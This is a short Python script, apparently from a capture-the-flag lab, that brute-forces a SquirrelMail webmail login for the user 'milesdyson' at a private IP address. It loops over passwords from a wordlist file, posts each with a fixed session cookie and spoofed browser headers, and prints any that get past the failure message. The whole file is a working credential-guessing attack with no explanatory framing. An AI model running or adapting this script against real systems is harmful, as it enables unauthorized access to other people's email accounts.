import requests
from pprint import pprint
cookies = {
    'squirrelmail_language': 'en_US',
    'SQMSESSID': 'scbblokuall92kf20du87n2am7',
}

headers = {
    'Connection': 'keep-alive',
    'Cache-Control': 'max-age=0',
    'Origin': 'http://10.10.122.198',
    'Upgrade-Insecure-Requests': '1',
    'DNT': '1',
    'Content-Type': 'application/x-www-form-urlencoded',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'Referer': 'http://10.10.122.198/squirrelmail/src/login.php',
    'Accept-Language': 'ar,en-US;q=0.9,en;q=0.8,sv-SE;q=0.7,sv;q=0.6',
}
username = 'milesdyson'
passwords = [ x.strip() for x in open('log1.txt').read().split('\n') if x]
#pprint(passwords)

for password in passwords:
    data = {
    'login_username': username,
    'secretkey': password,
    'js_autodetect_results': '1',
    'just_logged_in': '1'
    }
    response = requests.post('http://10.10.122.198/squirrelmail/src/redirect.php', headers=headers, cookies=cookies, data=data, verify=False)
    if "Unknown user or password incorrect." not in response.text:
        print(password)